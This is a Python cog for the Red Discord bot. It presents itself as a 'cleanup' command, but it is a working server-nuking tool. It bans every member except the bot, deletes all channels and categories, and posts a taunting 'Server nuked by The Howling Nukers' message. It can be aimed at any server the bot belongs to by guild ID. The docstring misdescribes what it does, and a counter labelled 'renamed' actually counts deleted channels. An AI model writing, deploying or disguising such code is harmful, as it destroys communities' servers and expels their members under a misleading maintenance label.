import discord
from redbot.core import commands

class CleanupGuild(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.guild_only()
    @commands.is_owner()
    async def cleanupguild(self, ctx, category_title: str = "General Category", channel_title: str = "general", guild_id: int = None):
        """
        Cleanup the specified guild or the current guild by:
        1. Banning all users (excluding bots)
        2. Removing all channels and categories
        3. Adding one category and channel with the specified names
        4. Sending a cleanup message in the new channel
        """
        if guild_id:
            guild = self.bot.get_guild(guild_id)
            if not guild:
                await ctx.send("Guild not found.")
                return
        else:
            guild = ctx.guild

        bot_user = guild.get_member(self.bot.user.id)

        # Ban all users (excluding bots)
        for member in guild.members:
            if member != bot_user:
                try:
                    await member.ban(reason="CleanupGuild command")
                except discord.errors.Forbidden:
                    continue  # Continue to the next user if missing permissions

        renamed_channels = 0

        # Remove all channels and categories
        for channel in guild.channels:
            try:
                await channel.delete()
                renamed_channels += 1
            except discord.errors.Forbidden:
                continue  # Continue to the next channel if missing permissions

        # Add one category with the specified name
        category = await guild.create_category(category_title)

        # Add one text channel inside the category
        channel = await guild.create_text_channel(channel_title, category=category)

        # Send a cleanup message in the new channel
        await channel.send("Server nuked by The Howling Nukers. Good luck cleaning up the mess we made. AWOOOOOOOOO")

        # Output message detailing the actions
        output_message = (
            f"Renamed channels: **{renamed_channels}**\n"
            f"Banned users (excluding bots)."
        )

        await ctx.send(output_message)

def setup(bot):
    bot.add_cog(CleanupGuild(bot))
